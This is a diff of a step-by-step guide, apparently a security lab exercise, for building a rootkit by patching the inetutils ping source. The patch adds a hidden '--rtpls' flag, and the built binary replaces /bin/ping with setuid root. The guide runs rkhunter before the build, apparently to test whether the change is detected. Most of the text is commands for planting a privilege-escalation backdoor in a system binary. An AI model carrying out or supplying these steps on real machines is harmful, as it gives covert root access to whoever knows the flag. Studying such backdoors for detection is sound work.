@@ -13,21 +13,19 @@
 #To the ~/.vimrc add 
     set mouse=a
 
-
 # Setp 1 Install and Run rkhunter
 
 #Install RootkitHunter (rkhunter) with Local Mail
-    sudo apt-get rkhunter
-#Update rkhunter DB : 
+    sudo apt-get install rkhunter
+#Update rkhunter DB (might fail due to invalid WEB_CMD):
     sudo rkhunter --update
 #Scan (Interactive): 
     sudo rkhunter -c
 #Copy log from /var/log/rkhunter.log to some safe place 
-    cp /var/log/rkhunter.log ~/Documents/step1.log
+    sudo cp /var/log/rkhunter.log ~/Documents/step1.log
 
 # Step 2 Build/Install Rootkit
 
-#
 #ping is found in APT-Sources: http://de.archive.ubuntu.com/ubuntu/ xenial universe
 #in /etc/apt/source.list uncomment/add 
     deb-src  http://de.archive.ubuntu.com/ubuntu/ xenial universe
@@ -35,20 +33,22 @@
 #refresh apt database
     sudo apt-get update
 
-#cd into a new/empty dir for downloading the ping src into
-# e.g. mkdir -p ~/Documents/Pingdoor && cd ~/Documents/Pingdoor
+#cd into a new/empty dir for downloading the ping src into e.g. 
+    mkdir -p ~/Documents/Pingdoor && cd ~/Documents/Pingdoor
 
 #get ping source 
     apt-get source inetutils-ping
 #install build dependencies 
     sudo apt-get build-dep inetutils-ping
-#test-compile while being in the inetutils-1.9.4 folder, this should succeed, this takes some time
-# build may complain about missing keys this is not a problem just ignore it
+#go into the inetutild-1.9.4 folder
+    cd inetutils-1.9.4
+#test-compile, this takes some time and should succeed
+#build may complain (error) about missing keys this is not a problem just ignore it
     dpkg-buildpackage
 
-#edit ping/ping.c using an editor of choise
+#edit ping/ping.c using an editor of choise e.g.
     vim ping/ping.c
-#add to the end of the unnamed? enum:
+#add to the end of the unnamed? (ca. line 101) enum:
 
 ARG_ROOT_PLS
 
@@ -78,11 +78,11 @@ case ARG_ROOT_PLS:
 #to test first set correct privileges with
     sudo chown root:root ping/ping
     sudo chmod u+s ping/ping
-#run ping with special flag
-    ping --rtpls
+#test run ping with special flag
+    ping/ping --rtpls
 
 #make a backup of the original ping (just in case)
-    cp /bin/ping ~/Documents/ping.bak
+    sudo cp /bin/ping ~/Documents/ping.bak
 #replace /bin/ping with our ping command
     sudo cp ping/ping /bin/ping
 #make sure it hase the setuid bit set (should not be necessary)
